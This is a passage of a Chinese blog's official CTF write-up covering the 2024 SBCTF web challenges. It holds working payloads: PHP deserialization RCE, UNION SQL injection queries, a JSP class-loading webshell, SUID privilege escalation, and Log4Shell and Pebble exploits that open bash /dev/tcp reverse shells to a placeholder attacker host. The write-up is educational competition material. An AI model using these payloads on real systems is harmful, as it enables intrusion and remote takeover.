@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2024 SBCTF Web Official WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2024 SBCTF Web Official WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2024-02-11
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/php/" title="PHP">
+                      #PHP
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/java/" title="Java">
+                      #Java
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/sql/" title="SQL">
+                      #SQL
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/linux/" title="Linux">
+                      #Linux
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote>
+<p>2024 SBCTF 是由吉林大学 Spirit 战队和中国矿业大学 BXS <span class="hexo-wm">𝒔﻿⑶𝘷ℯ𝘯∙​sｉ‌‌ｔe‍﻿</span>战队合办的网络安全寒假训练赛，<br>我们鼓励有志于加入 Spirit 未来一同参加比赛的同学参加本次训练赛，<br>本次比赛难度会每周递增，<span class="hexo-wm">s‍𝟯𝒗eｎ•‌‌𝘴𝘪​𝐭𝐞‍</span>帮助 0 基础同学入门，也会让有基础的同学有所收获，<br>我们会根据本次比赛表现择优选拔一些同学加入 Spirit。<br>比赛时间：2024.1.15 09:00 ~ 2024.2.11 22:00，共4周</p>
+</blockquote>
+<h1 id="比赛概况"><a href="#比赛概况" class="headerlink" title="比赛概况"></a>比赛概况</h1><p>本次 2024 SBCTF 大赛吸引了来自吉林大学、中国矿业大学、大连理工大学、东北大学、中山大学、西安电子科技大学、<span class="hexo-wm">ꜱ﻿‌³𝘷ｅ𝘯·​​𝒔ⅈ‍​𝘵e‌‍</span>南京理工大学、南京邮电大学、南京航空航天大学、杭州电子科技大学等众多院校的共计百余名选手参与，在激烈的竞争中产生了前 10 名表现优异的选手：</p>
+<p><img src="image-1.jpg" alt="image-1.jpg"></p>
+<blockquote>
+<p>作为本次比赛的 Web 出题人 和 <span class="hexo-wm">𝘴​³𝐯ｅn．​𝘀𝘪﻿𝒕e﻿‍</span>平台运维人 ，非常感谢大家本次前来参加与支持 SBCTF 比赛！</p>
+</blockquote>
+<h1 id="Week1-php-hacker"><a href="#Week1-php-hacker" class="headerlink" title="Week1 - php_hacker"></a>Week1 - php_hacker</h1><p>简单的 php <code>__wakeup()</code> 魔术方法 反序列化</p>
+<h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1. POC"></a>1. POC</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Executor</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$command</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// 创建 Executor 实例</span>
+<span class="token variable">$executor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Executor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$executor</span><span class="token operator">-&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system(\"&lt;command&gt;\");"</span><span class="token punctuation">;</span> <span class="token comment">// PHP 代码</span>
+
+<span class="token comment">// 序列化对象</span>
+<span class="token variable">$serializedData</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$executor</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Base64 编码</span>
+<span class="token variable">$encodedData</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$encodedData</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span></code></pre>
+<p><code>Executor</code> 类在被反序列化时会调用 <span class="hexo-wm">𝘀​³𝘷𝘦ｎ·‍‌sｉ​𝐭ｅ﻿‌</span>class 的 <code>__wakeup</code> 方法，<br>从而可以构造 <code>serailized payload</code> 实现 RCE</p>
+<h2 id="2"><a href="#2" class="headerlink" title="2. <command>"></a>2. &lt;command&gt;</h2><p><code>ls</code> 之后发现 flag <span class="hexo-wm">𝘀‍‍³𝒗℮𝘯∙​﻿ѕｉ‍t𝐞‌</span>在 /f_l_a_g 里，于是 <code>cat /f_l_a_g</code> 获得 flag</p>
+<p>ps：这题直接丢给 ChatGPT 好像能直接帮你做完，不亏是 Week1 难度</p>
+<h1 id="Week1-attack-shiro"><a href="#Week1-attack-shiro" class="headerlink" title="Week1 - attack_shiro"></a>Week1 - attack_shiro</h1><p>根据题目名称提示找到工具 <a href="https://github.com/SummerSec/ShiroAttack2/releases">ShiroAttack2</a></p>
+<h2 id="1-爆破-shiro-密钥"><a href="#1-爆破-shiro-密钥" class="headerlink" title="1. 爆破 shiro 密钥"></a>1. 爆破 shiro 密钥</h2><img src="image-2.png" alt="image-2.png" width="60%">
+
+<h2 id="2-爆破反序列化利用链及回显方式"><a href="#2-爆破反序列化利用链及回显方式" class="headerlink" title="2. 爆破反序列化利用链及回显方式"></a>2. 爆破反序列化利用链及回显方式</h2><img src="image-3.png" alt="image-3.png" width="60%">
+
+<h2 id="3-RCE"><a href="#3-RCE" class="headerlink" title="3. RCE"></a>3. RCE</h2><img src="image-4.png" alt="image-4.png" width="60%">
+
+<p>传说中的 3s 出，<span class="hexo-wm">s﻿​𝟯v𝘦ｎ．​‌𝘴ｉ‍𝒕e﻿‌</span>不知道为什么没人做 …</p>
+<h1 id="Week1-ez-sqli"><a href="#Week1-ez-sqli" class="headerlink" title="Week1 - ez_sqli"></a>Week1 - ez_sqli</h1><p>简单的 无wa<span class="hexo-wm">𝘀﻿​⑶v𝐞ｎ·​‌𝘴𝐢‌‍𝐭ｅ​﻿</span>f sql手注<br>由于前后端数据交互进行了两次 base64 加密和解密<br>所以没办法用 sqlmap 一把梭</p>
+<blockquote>
+<p>虽然理论上可以搞一个 py tamper 脚本<br>但那样难道不比直接手<span class="hexo-wm">𝒔﻿3v𝘦n<span class="hexo-wm">𝘀​3𝘷𝘦𝐧．﻿‍ꜱ𝘪‍𝐭℮‍</span>•‌𝘴ⅈ​t℮﻿</span>注复杂 (?)</p>
+</blockquote>
+<h2 id="1-登录界面（-login）"><a href="#1-登录界面（-login）" class="headerlink" title="1. 登录界面（/login）"></a>1. 登录界面（/login）</h2><p>由于攻击方不知道对方服务器的数据表名，我们需要先获取数据库名：</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span></code></pre>
+<p>接着获取目标敏<span class="hexo-wm">ꜱ​​³𝘷𝐞𝘯∙‍𝐬ⅈ‍ｔ𝘦​‍</span>感数据的列名</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='</span>secrets' <span class="token comment">-- </span></code></pre>
+<p>最后获取 flag</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>secret_info<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> secrets <span class="token comment">-- </span></code></pre>
+<p><img src="image-5.png" alt="image-5.png" width="50%" align="left"> <br><br><br><br></p>
+<h2 id="2-搜索界面（-search）"><a href="#2-搜索界面（-search）" class="headerlink" title="2. 搜索界面（/search）"></a>2. 搜索界面（/search）</h2><p>同理 两边注入点等<span class="hexo-wm">𝒔‌‍3𝘷𝘦ｎ．​ѕ𝘪​𝒕℮﻿‌</span>效 不具体解释</p>
+<pre class="language-none"><code class="language-none">'union select 1,1,group_concat(table_name),1 from information_schema.tables where table_schema=database() -- </code></pre>
+ <pre class="language-none"><code class="language-none">'union select 1,1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='secrets' -- </code></pre>
+ <pre class="language-none"><code class="language-none">'union select 1,1,group_concat(secret_info),1 from secrets -- </code></pre>
+
+<img src="image-6.png" alt="image-6.png" width="40%">
+
+<h1 id="Week1-ez-cat"><a href="#Week1-ez-cat" class="headerlink" title="Week1 - ez_cat"></a>Week1 - ez_cat</h1><p>Tomcat 后台 通过 war 包上传 jsp shell<br>suid perm <span class="hexo-wm">𝒔‍‌³𝘷ｅｎ•‍﻿𝘴ｉ﻿‍𝘵ｅ‍‌</span>使用 /usr/bin/date 提权 读取 /flag</p>
+<h2 id="1-Tomcat-后台-jsp-shell-上传"><a href="#1-Tomcat-后台-jsp-shell-上传" class="headerlink" title="1. Tomcat 后台 jsp shell 上传"></a>1. Tomcat 后台 jsp shell 上传</h2><p><img src="image-7.png" alt="image-7.png"></p>
+<p>点击 <code>Manager App</code> ，使用 Jerry 提示的密码 <code>admin:admin</code> 进入Tomcat 后台</p>
+<p>构造 <code>shell.jsp</code> 如下：</p>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+ 
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%&gt;
+&lt;%
+    String cls = request.getParameter("passwd");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%&gt;</code></pre>
+<p>打包成 <code>shell.war</code></p>
+<pre class="language-none"><code class="language-none">jar -cvf shell.war shell.jsp</code></pre>
+<p>上传至 Tomcat 后台</p>
+<img src="image-8.png" alt="image-8.png" width="80%">
+
+<p>使用 中国蚁剑 <span class="hexo-wm">ѕ‌‌3ⅴ𝘦𝒏∙​​𝐬i​𝘵e​</span>连接 shell：</p>
+<img src="image-9.png" alt="image-9.png" width="60%">
+
+
+<h2 id="2-suid-perm-使用-date-提权"><a href="#2-suid-perm-使用-date-提权" class="headerlink" title="2. suid perm 使用 date 提权"></a>2. suid perm 使用 date 提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+<span class="token function">date</span> <span class="token parameter variable">-f</span> /flag.txt</code></pre>
+<p>根据回显得到 flag</p>
+<h1 id="Week1-java-signin"><a href="#Week1-java-signin" class="headerlink" title="Week1 - java_signin"></a>Week1 - java_signin</h1><blockquote>
+<p>原题来自 NCTF 2023 - logging<br><a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.<span class="hexo-wm">𝘴‍⑶𝒗𝐞𝘯∙﻿‍sｉ‌tｅ‌‍</span>io/2023/12/nctf-<span class="hexo-wm">𝐬​³𝒗ℯ𝘯․‌‍𝐬ｉ‌𝒕𝘦‌</span>2023-web-official-writeup/#logging</a></p>
+</blockquote>
+<p>考点是在 log4j2 <span class="hexo-wm">s​⑶𝘷𝘦𝘯•﻿​sⅈ‌𝘵𝘦‌</span>默认配置下触发 <code>CVE-2021-44228</code> RCE</p>
+<p>使用工具：</p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n/JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p>
+<p>Server <span class="hexo-wm">s﻿³𝘷ℯ𝒏•​​𝐬𝐢﻿​t𝘦‌</span>Bash run：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c {echo,x}(x: 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1' encoded with base64)|{base64,-d}|{bash,-i}"</span> <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span></code></pre>
+<p>在 <code>/</code> 处的 Request 的 <span class="hexo-wm">𝘀​𝟯𝐯ｅ𝘯․‍𝒔i​​𝒕ｅ​</span>Accept Header 中注入 jndi，触发报错日志记录，</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">${jndi:rmi://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">&gt;</span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rmi_port</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ramdom_rmi_route</span><span class="token punctuation">&gt;</span></span>}</code></pre>
+<p>log4j2 远程加载 Class <span class="hexo-wm">𝘀​​⑶𝒗ℯｎ•​𝘀ｉ‍‍ｔ𝐞‌‌</span>类 反弹 Shell 获得 flag</p>
+<h1 id="Week2-ez-spring"><a href="#Week2-ez-spring" class="headerlink" title="Week2 - ez_spring"></a>Week2 - ez_spring</h1><blockquote>
+<p>本题最早可以追溯到 2022 UIUCTF <span class="hexo-wm">𝒔﻿​³𝘷e𝒏•‌𝘀𝘪​﻿𝒕e‌‍</span>- web/spoink<br>后在 2023 第七届强网杯中被用作强网先锋题（签到题）<br>本来是拿来当作 Week2 Web 的签到题的，但没想到解数这么少…<br>由于强网杯没有也不会对签到题放出 Hint，因此本题也没有放 Hint</p>
+</blockquote>
+<p>考点是 CVE-2022-<span class="hexo-wm">ѕ‌³vℯ𝐧․﻿﻿𝐬ⅈ‌‌te‍</span>37767: Pebble 3.1.5 RCE</p>
+<p>和强网杯原题一样，在放出的附件中没有给出 waf 内容<br>在远程靶机中屏蔽了一些类关键词，<span class="hexo-wm">𝘀‍​𝟯𝐯𝐞𝐧·﻿sｉ​𝘵e﻿</span>可以用字符串拼接绕过</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringFilter</span> <span class="token punctuation">{</span>
+  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">String</span> context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
+      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.beans.Beans"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
+      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context
+      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jacksonObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+
+<p>1.pebble</p>
+<pre class="language-none"><code class="language-none">{% set bypass1 = "org.springframework.boot.autoconfigure." %}
+{% set bypass2 = "internalCachingMetadataReaderFactory" %}
+{% set bypass3 = "java.beans." %}
+{% set bypass4 = "Beans" %}
+{% set bypass5 = "jackson" %}
+{% set bypass6 = "ObjectMapper" %}
+{% set bypass7 = "org.springframework.context.support." %}
+{% set bypass8 = "ClassPathXmlApplicationContext" %}
+{% set y = beans.get(bypass1+bypass2).resourceLoader.classLoader.loadClass(bypass3+bypass4) %}
+{% set yy = beans.get(bypass5+bypass6).readValue("{}", y) %}
+{% set yyy = yy.instantiate(null,bypass7+bypass8) %}
+{{ yyy.setConfigLocation("1.xml") }}
+{{ yyy.refresh() }}</code></pre>
+<p>1.xml</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
+       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>echo x|base64 -d|bash -i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span> 
+                <span class="token comment">&lt;!-- x: "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1" encoded with base64 --&gt;</span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span></code></pre>
+<p>通过 <code>/uploadFile</code> 路由上传 1.<span class="hexo-wm">𝐬﻿𝟯𝒗𝘦𝐧·​s𝘪‍​𝒕ｅ‍﻿</span>pebble，再通过 <code>/</code> 路由访问上传的 template 模板，远程加载 1.xml 实现 RCE，最后反弹 Shell 获得 flag</p>
+<h1 id="Week3-ez-cfs"><a href="#Week3-ez-cfs" class="headerlink" title="Week3 - ez_cfs"></a>Week3 - ez_cfs</h1><h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p><img src="image-10.png" alt="image-10.png"></p>
+<h2 id="1-ez-cfs-part1"><a href="#1-ez-cfs-part1" class="headerlink" title="1. ez_cfs_part1"></a>1. ez_cfs_part1</h2><blockquote>
+<p>出题思路来自：<br><a href="https://exp10it.io/2023/10/spring-amqp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2023-34050-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/spring-amqp-反序列化漏洞-<span class="hexo-wm">s​‍³ⅴℯｎ．‍​sⅈ‌‍𝒕𝘦‌</span>cve-2023-34050-分析/</a></p>
+</blockquote>
+<p>CVE-2023-34050：<span class="hexo-wm">𝘴﻿‌³𝐯ｅ𝒏∙​‌𝘴ｉ﻿​𝒕𝐞﻿</span>Spring AMQP 反序列化漏洞</p>
+<blockquote>
+<p>根据 Spring 官方通告的描述, <span class="hexo-wm">𝘀‍​𝟯𝒗𝘦ｎ․﻿ꜱｉ‍﻿t𝐞‍‍</span>满足以下条件时则存在漏洞</p>
+<ul>
+<li>使用 SimpleMessageConverter <span class="hexo-wm">𝒔‍3v℮𝐧․‌𝐬𝐢‌‌𝐭𝐞‍‌</span>或 SerializerMessageConverter (默认为 SimpleMessageConverter)</li>
+<li>开发者没有配置 <span class="hexo-wm">ѕ​3v𝘦n․​‌ꜱi​𝘵ｅ‍</span>allowed list patterns</li>
+<li>攻击者可以向 RabbitMQ 服务器的某个 <span class="hexo-wm">s‍³𝘷𝘦𝐧․​ѕi‌𝘵℮‍﻿</span>Queue 内写入 Message <span class="hexo-wm">𝒔﻿‌³ⅴｅ𝘯.‌﻿𝐬ｉ﻿​𝒕e​​</span>(RabbitMQ 未授权/弱口令/可配置 RabbitMQ 连接参数)</li>
+<li>必须得有对应的 Listener 来处理接收到的 <span class="hexo-wm">𝘴‍3𝐯ℯ𝐧․‌﻿ѕ𝐢﻿‌𝐭e‌</span>Message (使用 @RabbitListener 或 @RabbitHandler 注解)</li>
+</ul>
+</blockquote>
+<p>首先是爆破 RabbitMQ 服务器的弱口令，简单尝试后可以得出是 Test:654321<br>然后使用 Jackson <span class="hexo-wm">𝐬‍⑶𝐯eｎ·‍𝘀𝐢‌𝒕ｅ‌‍</span>原生反序列化 + TemplatesImpl</p>
+<h3 id="1-1-Jackson-原生反序列化链"><a href="#1-1-Jackson-原生反序列化链" class="headerlink" title="1.1 Jackson 原生反序列化链"></a>1.1 Jackson 原生反序列化链</h3><p>Gadgets.java</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gadgets</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">TemplatesImpl</span> <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
